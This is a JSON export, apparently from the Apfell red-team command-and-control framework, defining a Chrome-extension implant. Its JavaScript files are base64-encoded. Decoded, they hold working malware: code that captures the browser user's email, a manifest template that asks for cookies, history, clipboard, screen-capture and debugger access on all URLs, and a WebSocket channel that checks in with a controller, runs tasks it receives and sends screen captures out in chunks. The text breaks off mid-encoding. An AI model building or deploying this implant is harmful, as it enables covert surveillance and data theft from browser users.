{"payload_types":[{"wrapper":false,"command_template":"\n","supported_os":"linux (x86),linux (x64),macOS (x86),macOS (x64),Windows (x86),Windows (x64)","execute_help":"","external":false,"container_running":true,"service":"rabbitmq","author":"apfell_admin","note":"","supports_dynamic_loading":true,"last_heartbeat":"01\/22\/2020 14:54:32","ptype":"chrome-extension","file_extension":"js","wrapped_payload_type":"null","icon":null,"files":[{"chrome-extension.js":"Ly8tLS0tLS0tLS0tLS0tLUlNUExBTlQgSU5GT1JNQVRJT04tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpjbGFzcyBpbXBsYW50ewogICAgY29uc3RydWN0b3IoKXsKICAgICAgICB0aGlzLmhvc3RpbmZvID0gImNocm9tZSI7CiAgICAgICAgdGhpcy51c2VyaW5mbyA9ICcnOwogICAgICAgIHRoaXMucHJvY2luZm8gPSAwOwogICAgICAgIHRoaXMudXVpZCA9ICJVVUlEX0hFUkUiOwogICAgICAgIHRoaXMuYXBmZWxsaWQgPSAwOwogICAgfQp9Cgp2YXIgYXBmZWxsID0gbmV3IGltcGxhbnQoKTsKLy8tLS0tLS0tLS0tLS0tLUJhc2UgQzIgSU5GT1JNQVRJT04tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KY2xhc3MgYmFzZUMyIHsKICAgIGNvbnN0cnVjdG9yKGhvc3QsIHBvcnQsIGVuZHBvaW50LCBzc2wsIGludGVydmFsKSB7CiAgICAgICAgdGhpcy5ob3N0ID0gaG9zdDsKICAgICAgICB0aGlzLnBvcnQgPSBwb3J0OwogICAgICAgIHRoaXMucHJvdG8gPSAnJzsKICAgICAgICB0aGlzLmludGVydmFsID0gaW50ZXJ2YWw7CiAgICAgICAgdGhpcy5jb21tYW5kcyA9IHt9OwoKICAgICAgICBpZiAoc3NsID09PSB0cnVlKSB7CiAgICAgICAgICAgIHRoaXMucHJvdG8gPSAnd3NzOi8vJzsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICB0aGlzLnByb3RvID0gJ3dzOi8vJzsKICAgICAgICB9CiAgICAgICAgdGhpcy5zZXJ2ZXIgPSBgJHt0aGlzLnByb3RvfSR7dGhpcy5ob3N0fToke3RoaXMucG9ydH0vJHtlbmRwb2ludH1gOwogICAgfQoKICAgIGdldEludGVydmFsKCl7CiAgICAgICAgcmV0dXJuIHRoaXMuaW50ZXJ2YWw7CiAgICB9CgogICAgZ2V0Q29uZmlnKCl7CiAgICAgICAgLy8gcmV0dXJuIHRoZSBjMiBjb25maWcKICAgIH0KCiAgICBwb3N0UmVzcG9uc2UoKXsKICAgICAgICAvL291dHB1dCBhIHJlc3BvbnNlIHRvIGEgdGFzawogICAgfQogICAgc2V0Q29uZmlnKCl7CiAgICAgICAgLy9Ob3QgaW1wbGVtZW50ZWQKICAgIH0KICAgIGRvd25sb2FkKCl7CiAgICAgICAgLy9Ob3QgSW1wbGVtZW50ZWQKICAgIH0KICAgIHVwbG9hZCgpewogICAgICAgIC8vTm90IGltcGxlbWVudGVkCiAgICB9CgogICAgY2hlY2tJbigpewogICAgICAgIC8vIHJlZ2lzdGVyIHRoaXMgY2FsbGJhY2sgd2l0aCB0aGUgc2VydmVyCiAgICB9CgogICAgc2VuZFJlc3BvbnNlKCl7CiAgICAgICAgLy8gU2VuZCBhIHJlc3BvbnNlIHRvIHRoZSBzZXJ2ZXIKICAgIH0KfQoKLy8tLS0tLS0tLS0tLS0tU0hBUkVEIENPTU1BTkQgQ09ERSAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KbGV0IGtleWxvZ1Rhc2tJRCA9IDA7CmxldCBrZXlsb2dnZXJzID0gW107CgoKY2hyb21lLmlkZW50aXR5LmdldFByb2ZpbGVVc2VySW5mbyhmdW5jdGlvbihpbmZvKXsKICAgIGFwZmVsbC51c2VyaW5mbyA9IGluZm8uZW1haWw7Cn0pOwovLyBDMiBQcm9maWxlIENvZGUKQzJQUk9GSUxFX0hFUkUKLy8gQ29tbWFuZHMKQ09NTUFORFNfSEVSRQ=="},{"extension\/icons\/blank.png":"iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAYAAADDPmHLAAAAAXNSR0IArs4c6QAAAAlwSFlzAAALEwAACxMBAJqcGAAAActpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IlhNUCBDb3JlIDUuNC4wIj4KICAgPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4KICAgICAgPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIKICAgICAgICAgICAgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIgogICAgICAgICAgICB4bWxuczp0aWZmPSJodHRwOi8vbnMuYWRvYmUuY29tL3RpZmYvMS4wLyI+CiAgICAgICAgIDx4bXA6Q3JlYXRvclRvb2w+QWRvYmUgSW1hZ2VSZWFkeTwveG1wOkNyZWF0b3JUb29sPgogICAgICAgICA8dGlmZjpPcmllbnRhdGlvbj4xPC90aWZmOk9yaWVudGF0aW9uPgogICAgICA8L3JkZjpEZXNjcmlwdGlvbj4KICAgPC9yZGY6UkRGPgo8L3g6eG1wbWV0YT4KKS7NPQAAATZJREFUeAHt0DEBAAAAwqD1T20MH4hAYcCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMGDBgwYMCAAQMG\/gMDAI8AAVgV38wAAAAASUVORK5CYII="},{"manifest-template.json":"ewogICJuYW1lIjogIkVYVEVOU0lPTl9OQU1FX1JFUExBQ0UiLAogICJ2ZXJzaW9uIjogIjEuMCIsCiAgIm1hbmlmZXN0X3ZlcnNpb24iOiAyLAogICJkZXNjcmlwdGlvbiI6ICJERVNDUklQVElPTl9SRVBMQUNFIiwKICAiaG9tZXBhZ2VfdXJsIjogImh0dHA6Ly93d3cuZXhhbXBsZS5jb20vZGVidWdleHRlbnNpb24iLAogICJjb250ZW50X3NlY3VyaXR5X3BvbGljeSI6ICJzY3JpcHQtc3JjICdzZWxmJyAndW5zYWZlLWV2YWwnOyBvYmplY3Qtc3JjICdzZWxmJyIsCiAgImJhY2tncm91bmQiOiB7CiAgICAic2NyaXB0cyI6IFsKICAgICAgInNyYy9iZy9tYWluLmpzIgogICAgXSwKICAgICJwZXJzaXN0ZW50IjogdHJ1ZQogIH0sCiAgInVwZGF0ZV91cmwiIDogImh0dHA6Ly93d3cuZXhhbXBsZS5jb20vdXBkYXRlLnhtbCIsCiAgInBlcm1pc3Npb25zIjogWwogICAgImJvb2ttYXJrcyIsCiAgICAid2ViTmF2aWdhdGlvbiIsCiAgICAiY2xpcGJvYXJkUmVhZCIsCiAgICAiY2xpcGJvYXJkV3JpdGUiLAogICAgImNvbnRlbnRTZXR0aW5ncyIsCiAgICAiY29udGV4dE1lbnVzIiwKICAgICJjb29raWVzIiwKICAgICJoaXN0b3J5IiwKICAgICJpZGxlIiwKICAgICJtYW5hZ2VtZW50IiwKICAgICJub3RpZmljYXRpb25zIiwKICAgICJ0YWJzIiwKICAgICJpZGVudGl0eSIsCiAgICAiaWRlbnRpdHkuZW1haWwiLAogICAgImFsYXJtcyIsCiAgICAiYmFja2dyb3VuZCIsCiAgICAiYnJvd3NpbmdEYXRhIiwKICAgICJjb250ZW50U2V0dGluZ3MiLAogICAgImNvb2tpZXMiLAogICAgImRlYnVnZ2VyIiwKICAgICJkZWNsYXJhdGl2ZUNvbnRlbnQiLAogICAgImRlc2t0b3BDYXB0dXJlIiwKICAgICJkb3dubG9hZHMiLAogICAgImdjbSIsCiAgICAiaGlzdG9yeSIsCiAgICAiaWRsZSIsCiAgICAicG93ZXIiLAogICAgInByaXZhY3kiLAogICAgInByb3h5IiwKICAgICJzeXN0ZW0uY3B1IiwKICAgICJ0YWJDYXB0dXJlIiwKICAgICJ0YWJzIiwKICAgICJ1bmxpbWl0ZWRTdG9yYWdlIiwKICAgICJ3ZWJSZXF1ZXN0IiwKICAgICJuYXRpdmVNZXNzYWdpbmciLAogICAgImdlb2xvY2F0aW9uIiwKICAgICJ3ZWJSZXF1ZXN0QmxvY2tpbmciLAogICAgImRvd25sb2FkcyIsCiAgICAiZG93bmxvYWRzLm9wZW4iLAogICAgIjxhbGxfdXJscz4iCiAgXQp9Cg=="}],"c2_profiles":{"chrome-server":[{"chrome-server.js":"Ly8tLS0tLS0tLS0tLS0tIENocm9tZSBFeHRlbnNpb24gV2Vic29ja2V0IEMyIG1lY2hhbmlzbXMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCi8vIERpY3Rpb25hcnkgdGhhdCBob2xkcyBvdXRib3VuZCBtZXNzYWdlcwp2YXIgb3V0ID0gW107CmxldCBzY3JlZW5jYXB0dXJlcyA9IFtdOwpsZXQgbG9hZHMgPSBbXTsKY2xhc3MgY3VzdG9tQzIgZXh0ZW5kcyBiYXNlQzJ7CiAgICBjb25zdHJ1Y3Rvcihob3N0LCBwb3J0LCBlbmRwb2ludCwgc3NsICwgaW50ZXJ2YWwpewogICAgICAgIHN1cGVyKGhvc3QsIHBvcnQsIGVuZHBvaW50LCBzc2wsIGludGVydmFsKTsKICAgICAgICB0aGlzLmhvc3QgPSBob3N0OwogICAgICAgIHRoaXMucG9ydCA9IHBvcnQ7CiAgICAgICAgdGhpcy5lbmRwb2ludCA9IGVuZHBvaW50OwogICAgICAgIHRoaXMuaW50ZXJ2YWwgPSBpbnRlcnZhbDsKICAgICAgICB0aGlzLmNvbW1hbmRzID0ge307CgogICAgICAgIGlmIChzc2wgPT09IHRydWUpewogICAgICAgICAgICB0aGlzLnByb3RvID0gJ3dzczovLyc7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgdGhpcy5wcm90byA9ICd3czovLyc7CiAgICAgICAgfQoKICAgICAgICB0aGlzLnNlcnZlciA9IGAke3RoaXMucHJvdG99JHt0aGlzLmhvc3R9OiR7dGhpcy5wb3J0fS8ke3RoaXMuZW5kcG9pbnR9YDsKICAgIH0KCiAgICBnZXRDb25maWcoKSB7CiAgICAgICAgcmV0dXJuIEpTT04uc3RyaW5naWZ5KHsnc2VydmVyJzogdGhpcy5zZXJ2ZXIsICdpbnRlcnZhbCc6dGhpcy5pbnRlcnZhbCwgJ2NvbW1hbmRzJzogSlNPTi5zdHJpbmdpZnkodGhpcy5jb21tYW5kcyl9KTsKICAgIH0KCiAgICBjaGVja0luKCkgewogICAgICAgIGNvbnN0IG1zZyA9IHsKICAgICAgICAgICAgImFjdGlvbiI6ImNoZWNraW4iLAogICAgICAgICAgICAib3MiOiJjaHJvbWUiLAogICAgICAgICAgICAidXNlciI6YXBmZWxsLnVzZXJpbmZvLAogICAgICAgICAgICAidXVpZCI6YXBmZWxsLnV1aWQsCiAgICAgICAgICAgICJob3N0IjphcGZlbGwudXNlcmluZm8gKyAiJ3MgY2hyb21lIiwKICAgICAgICAgICAgInBpZCI6MCwKICAgICAgICAgICAgImlwIjonMTI3LjAuMC4xJywKICAgICAgICB9OwoKICAgICAgICBsZXQgY2hlY2tpbiA9IEpTT04uc3RyaW5naWZ5KG1zZyk7CiAgICAgICAgbGV0IGNoZWNraW5wYXlsb2FkID0gYXBmZWxsLnV1aWQgKyBjaGVja2luOwoKICAgICAgICBjb25zdCBtZXRhID0gewogICAgICAgICAgICAiY2xpZW50IjogdHJ1ZSwKICAgICAgICAgICAgImRhdGEiOiBidG9hKHVuZXNjYXBlKGVuY29kZVVSSUNvbXBvbmVudChjaGVja2lucGF5bG9hZCkpKSwKICAgICAgICAgICAgInRhZyI6IiIsCiAgICAgICAgfTsKCiAgICAgICAgY29uc3QgZW5jbXNnID0gSlNPTi5zdHJpbmdpZnkobWV0YSk7CiAgICAgICAgY29ubmVjdGlvbi5zZW5kKGVuY21zZyk7CiAgICAgICAgY29uc29sZS5sb2coJ1NlbnQgaW5pdGlhbCBjaGVja2luJyk7CiAgICB9CgogICAgcG9zdFJlc3BvbnNlKCl7CiAgICAgICAgaWYgKG91dC5sZW5ndGggPiAwKXsKICAgICAgICAgICAgLy8gUG9wIGFuZCBzZW5kIGEgbWVzc2FnZSB0byB0aGUgY29udHJvbGxlcgogICAgICAgICAgICB3aGlsZSAob3V0Lmxlbmd0aCA+IDApIHsKICAgICAgICAgICAgICAgIGNvbnN0IG1zZyA9IG91dC5zaGlmdCgpOwogICAgICAgICAgICAgICAgY29uc3QgbWV0YSA9IHsKICAgICAgICAgICAgICAgICAgICAiY2xpZW50Ijp0cnVlLAogICAgICAgICAgICAgICAgICAgICJkYXRhIjogbXNnLAogICAgICAgICAgICAgICAgICAgICJ0YWciOiIiCiAgICAgICAgICAgICAgICB9OwogICAgICAgICAgICAgICAgbGV0IGZpbmFsID0gSlNPTi5zdHJpbmdpZnkobWV0YSk7CiAgICAgICAgICAgICAgICBjb25uZWN0aW9uLnNlbmQoZmluYWwpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CgovLy0tLS0tLS0tLS0tLS0gSU5TVEFOVElBVEUgT1VSIEMyIENMQVNTIEJFTE9XIEhFUkUgSU4gTUFJTiBDT0RFLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KY29uc3QgQzIgPSBuZXcgY3VzdG9tQzIoJ0hPU1RfUkVQTEFDRScsICBQT1JUX1JFUExBQ0UsICdFTkRQT0lOVF9SRVBMQUNFJywgU1NMX1JFUExBQ0UsIElOVEVSVkFMX1JFUExBQ0UpOwpjb25zdCBjb25uZWN0aW9uICA9IG5ldyBXZWJTb2NrZXQoYCR7QzIuc2VydmVyfWApOwoKZnVuY3Rpb24gY2h1bmtBcnJheShhcnJheSwgc2l6ZSkgewogICAgaWYoYXJyYXkubGVuZ3RoIDw9IHNpemUpewogICAgICAgIHJldHVybiBbYXJyYXldOwogICAgfQoKICAgIHJldHVybiBbYXJyYXkuc2xpY2UoMCxzaXplKSwgLi4uY2h1bmtBcnJheShhcnJheS5zbGljZShzaXplKSwgc2l6ZSldOwp9CgpzZXRJbnRlcnZhbChmdW5jdGlvbigpewogICAgQzIucG9zdFJlc3BvbnNlKCk7CiAgICBpZiAoYXBmZWxsLmFwZmVsbGlkLmxlbmd0aCAhPT0gMCkgewogICAgICAgIGxldCByZXF1ZXN0ID0geydhY3Rpb24nOidnZXRfdGFza2luZycsICd0YXNraW5nX3NpemUnOiAxLCAnZGVsZWdhdGVzJzpbXX07CiAgICAgICAgbGV0IG1zZyA9IEpTT04uc3RyaW5naWZ5KHJlcXVlc3QpOwogICAgICAgIGxldCBmaW5hbCA9IGFwZmVsbC5hcGZlbGxpZCArIG1zZzsKICAgICAgICBsZXQgZW5jZmluYWwgPSBidG9hKHVuZXNjYXBlKGVuY29kZVVSSUNvbXBvbmVudChmaW5hbCkpKTsKICAgICAgICBvdXQucHVzaChlbmNmaW5hbCk7CiAgICB9IGVsc2UgewogICAgICAgIGNvbnNvbGUubG9nKCdBcGZlbGwgaWQgbm90IHNldCBmb3IgdGFza2luZyAnICsgYXBmZWxsLmFwZmVsbGlkKTsKICAgIH0KfSwgQzIuaW50ZXJ2YWwgKiAxMDAwKTsKCmNvbm5lY3Rpb24ub25vcGVuID0gZnVuY3Rpb24gKCkgewogICAgQzIuY2hlY2tJbigpOwp9OwoKY29ubmVjdGlvbi5vbmNsb3NlID0gZnVuY3Rpb24gKCkgewogICAgLy8gRG8gTm90aGluZwp9OwoKY29ubmVjdGlvbi5vbmVycm9yID0gZnVuY3Rpb24gKCkgewogICAgLy8gRG8gTm90aGluZwp9OwoKY29ubmVjdGlvbi5vbm1lc3NhZ2UgPSBmdW5jdGlvbiAoZSkgewogICAgY29uc3QgcmF3bXNnID0gSlNPTi5wYXJzZShlLmRhdGEpOwogICAgY29uc3QgZGVjb2RlZCA9IGF0b2IocmF3bXNnLmRhdGEpOwogICAgY29uc3QgbWVzc2FnZW5vdXVpZCA9IGRlY29kZWQuc2xpY2UoMzYsIGRlY29kZWQubGVuZ3RoKTsKCiAgICBjb25zdCBtZXNzYWdlID0gSlNPTi5wYXJzZShtZXNzYWdlbm91dWlkKTsKICAgIGNvbnNvbGUubG9nKCdSZWNlaXZlZCBtc2c6ICcgKyBtZXNzYWdlKTsKICAgIHN3aXRjaCAobWVzc2FnZS5hY3Rpb24pIHsKICAgICAgICBjYXNlICdjaGVja2luJzogewogICAgICAgICAgICAvLyBjYWxsYmFjayBjaGVjayBpbgogICAgICAgICAgICBhcGZlbGwuYXBmZWxsaWQgPSBtZXNzYWdlLmlkOwogICAgICAgICAgICBicmVhazsKICAgICAgICB9CiAgICAgICAgY2FzZSAnZ2V0X3Rhc2tpbmcnIDogewogICAgICAgICAgICAvLyBoYW5kbGUgYW4gYXBmZWxsIG1lc3NhZ2UKCiAgICAgICAgICAgIGZvciAobGV0IGluZGV4ID0gMDsgaW5kZXggPCBtZXNzYWdlLnRhc2tzLmxlbmd0aDsgaW5kZXgrKykgewogICAgICAgICAgICAgICAgY29uc3QgdGFzayA9IG1lc3NhZ2UudGFza3NbaW5kZXhdOwoKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgQzIuY29tbWFuZHNbdGFzay5jb21tYW5kXSh0YXNrKTsKICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgICAgICAgICAgICAgbGV0IHJlc3BvbnNlID0geyd0YXNrX2lkJzp0YXNrLmlkLCAnY29tcGxldGVkJzpmYWxzZSwgJ3N0YXR1cyc6J2Vycm9yJywgJ2Vycm9yJzonZXJyb3IgcHJvY2Vzc2luZyB0YXNrIGZvciBpZCAnICsgdGFzay5pZH07CiAgICAgICAgICAgICAgICAgICAgbGV0IG91dGVyX3Jlc3BvbnNlID0geydhY3Rpb24nOidwb3N0X3Jlc3BvbnNlJywncmVzcG9uc2VzJzpbcmVzcG9uc2VdLCAnZGVsZWdhdGVzJzpbXX07CiAgICAgICAgICAgICAgICAgICAgbGV0IG1zZyA9IGJ0b2EodW5lc2NhcGUoZW5jb2RlVVJJQ29tcG9uZW50KGFwZmVsbC5hcGZlbGxpZCArIEpTT04uc3RyaW5naWZ5KG91dGVyX3Jlc3BvbnNlKSkpKTsKICAgICAgICAgICAgICAgICAgICBvdXQucHVzaChtc2cpOwogICAgICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKCJFcnJvciBleGVjdXRpbmcgdGFzazogIiArIGVycik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGJyZWFrOwogICAgICAgIH0KICAgICAgICBjYXNlICdwb3N0X3Jlc3BvbnNlJyA6IHsKICAgICAgICAgICAgZm9yIChsZXQgaW5kZXggPSAwOyBpbmRleCA8IG1lc3NhZ2UucmVzcG9uc2VzLmxlbmd0aDsgaW5kZXgrKykgewogICAgICAgICAgICAgICAgY29uc3QgcmVzcG9uc2UgPSBtZXNzYWdlLnJlc3BvbnNlc1tpbmRleF07CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC8vIGNoZWNrIGZvciBzY3JlZW5jYXB0dXJlcyAKICAgICAgICAgICAgICAgIGlmIChzY3JlZW5jYXB0dXJlcy5sZW5ndGggPiAwKSB7CiAgICAgICAgICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBzY3JlZW5jYXB0dXJlcy5sZW5ndGg7IGkrKykgewogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBjYXB0dXJlID0gc2NyZWVuY2FwdHVyZXNbaV07CiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBlcXVhbCA9IHJlc3BvbnNlLnRhc2tfaWQubG9jYWxlQ29tcGFyZShjYXB0dXJlLnRhc2tfaWQpOwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoZXF1YWwgPT09IDApIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIFRPRE86IGNodW5rIHRoZSBzY3JlZW5jYXB0dXJlIGRhdGEKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCByYXcgPSBjYXB0dXJlLmltYWdlOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGFyckxlbmd0aCA9IHJhdy5sZW5ndGg7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgdGVtcCA9IFtdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGNodW5rU2l6ZSA9IDUxMjAwMDsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoY2h1bmtTaXplID4gcmF3Lmxlbmd0aCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRlbXAucHVzaChyYXcpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0ZW1wID0gY2h1bmtBcnJheShyYXcsIGNodW5rU2l6ZSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gbG9vcCB0aHJvdWdoIHRoZSBjaHVuayBhcnJheSBhbmQgc2VuZCBlYWNoIG9uZSB0byBhcGZlbGwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciAobGV0IGogPSAwOyBqIDwgdGVtcC5sZW5ndGg7IGorKykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCByZXNwb25zZSA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NodW5rX251bSc6IGorMSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2ZpbGVfaWQnOiByZXNwb25zZS5maWxlX2lkLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2h1bmtfZGF0YSc6IGJ0b2EodW5lc2NhcGUoZW5jb2RlVVJJQ29tcG9uZW50KHRlbXBbal0pKSksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd0YXNrX2lkJzogY2FwdHVyZS50YXNrX2lkLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH07CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBvdXRlcl9yZXNwb25zZSA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2FjdGlvbic6J3Bvc3RfcmVzcG9uc2UnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAncmVzcG9uc2VzJzpbcmVzcG9uc2VdLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZGVsZWdhdGVzJzpbXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH07CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBlbmMgPSBKU09OLnN0cmluZ2lmeShvdXRlcl9yZXNwb25zZSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGZpbmFsID0gYXBmZWxsLmFwZmVsbGlkICsgZW5jOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBtc2cgPSBidG9hKHVuZXNjYXBlKGVuY29kZVVSSUNvbXBvbmVudChmaW5hbCkpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvdXQucHVzaChtc2cpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCByZXNwb25zZSA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAndGFza19pZCc6cmVzcG9uc2UudGFza19pZCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAndXNlcl9vdXRwdXQnOidzY3JlZW5jYXB0dXJlIGNvbXBsZXRlJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY29tcGxldGUnOnRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBvdXRlcl9yZXNwb25zZSA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnYWN0aW9uJzoncG9zdF9yZXNwb25zZScsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3Jlc3BvbnNlcyc6W3Jlc3BvbnNlXSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZGVsZWdhdGVzJzpbXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgZW5jID0gSlNPTi5zdHJpbmdpZnkob3V0ZXJfcmVzcG9uc2UpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGZpbmFsID0gYXBmZWxsLmFwZmVsbGlkICsgZW5jOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IG1zZyA9IGJ0b2EodW5lc2NhcGUoZW5jb2RlVVJJQ29tcG9uZW50KGZpbmFsKSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3V0LnB1c2gobXNnKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzY3JlZW5jYXB0dXJlc1tpXSA9IHt9OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHNjcmVlbmNhcHR1cmVzLmxlbmd0aCA9PT0gMSApIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzY3JlZW5jYXB0dXJlcyA9IFtdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICBicmVhazsKICAgICAgICB9CiAgICAgICAgY2FzZSAndXBsb2FkJyA6IHsKICAgICAgICAgICAgLy8gY2hlY2sgZm9yIGxvYWQgY29tbWFuZCByZXNwb25zZXMKICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBtZXNzYWdlLnJlc3BvbnNlcy5sZW5ndGg7IGkrKykgewogICAgICAgICAgICAgICAgY29uc3QgcmVzcG9uc2UgPSBtZXNzYWdlLnJlc3BvbnNlW2ldOwogICAgICAgICAgICAgICAgaWYgKGxvYWRzLmxlbmd0aCA+IDApIHsKICAgICAgICAgICAgICAgICAgICBmb3IgKGxldCBqID0gMDsgaiA8IGxvYWRzLmxlbmd0aDsgaisrKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBlcXVhbCA9IHJlc3BvbnNlLnRhc2tfaWQubG9jYWxlQ29tcGFyZShsb2Fkc1tqXS50YXNrX2lkKTsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGVxdWFsID09PSAwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgbG9hZCA9IGxvYWRzW2pdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHJlc3BvbnNlLmNodW5rX251bSA8IHJlc3BvbnNlLnRvdGFsX2NodW5rcykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCByYXcgPSBhdG9iKHJlc3BvbnNlLmNodW5rX2RhdGEpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvYWQuZGF0YS5wdXNoKC4uLnJhdyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9hZHNbal0gPSBsb2FkOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCByZXNwID0geydhY3Rpb24nOid1cGxvYWQnLCdjaHVua19zaXplJzogMTAyNDAwMCwgJ2NodW5rX251bSc6KHJlc3BvbnNlLmNodW5rX251bSArIDEpLCAnZmlsZV9pZCc6bG9hZC5maWxlX2lkLCAnZnVsbF9wYXRoJzonJ307CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGVuY29kZWRSZXNwb25zZSA9IEpTT04uc3RyaW5naWZ5KHJlc3ApOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBmaW5hbCA9IGFwZmVsbC5hcGZlbGxpZCArIGVuY29kZWRSZXNwb25zZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgbXNnID0gYnRvYSh1bmVzY2FwZShlbmNvZGVVUklDb21wb25lbnQoZmluYWwpKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb3V0LnB1c2gobXNnKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAocmVzcG9uc2UuY2h1bmtfbnVtID09PSByZXNwb25zZS50b3RhbF9jaHVua3MpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgcmF3ID0gYXRvYihyZXNwb25zZS5jaHVua19kYXRhKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2FkLmRhdGEucHVzaCg